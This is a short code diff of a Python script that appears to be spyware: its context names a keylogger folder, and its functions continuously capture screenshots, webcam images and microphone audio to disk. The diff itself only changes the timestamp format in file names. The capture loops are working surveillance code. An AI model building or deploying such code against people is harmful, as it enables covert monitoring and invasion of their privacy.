@@ -46,7 +46,7 @@ if not os.path.exists(keylog_folder):
 
 def capture_and_save_screen(output_folder):
     while True:
-        current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
+        current_time = datetime.now().strftime("%d%m%Y_%H%M%S")
         with mss.mss() as sct:
             screenshot_path = os.path.join(output_folder, f"screenshot_{current_time}.png")
             sct.shot(output=screenshot_path)
@@ -56,7 +56,7 @@ def capture_and_save_webcam(output_folder):
     cap = cv2.VideoCapture(0)
     while True:
         ret, frame = cap.read()
-        current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
+        current_time = datetime.now().strftime("%d%m%Y_%H%M%S")
         image_path = os.path.join(output_folder, f"webcam_{current_time}.png")
         cv2.imwrite(image_path, frame)
         time.sleep(save_interval)
@@ -65,7 +65,7 @@ def capture_and_save_webcam(output_folder):
 def record_and_save_audio(output_folder):
     while True:
         record_duration = 30  #Duration of each audio recording
-        current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
+        current_time = datetime.now().strftime("%d%m%Y_%H%M%S")
         audio_path = os.path.join(output_folder, f"audio_{current_time}.wav")
         audio_data = sd.rec(int(record_duration * 44100), samplerate=44100, channels=2, dtype='int16')
         sd.wait()
